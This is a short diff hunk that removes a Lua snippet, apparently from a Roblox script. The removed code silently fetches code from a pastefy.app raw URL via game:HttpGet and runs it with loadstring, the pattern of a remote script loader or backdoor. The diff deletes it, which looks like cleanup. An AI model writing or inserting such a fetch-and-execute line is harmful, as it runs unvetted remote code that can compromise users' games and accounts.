@@ -1,3 +1,0 @@
-pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/v6ItHQUv/raw"))()
-end)
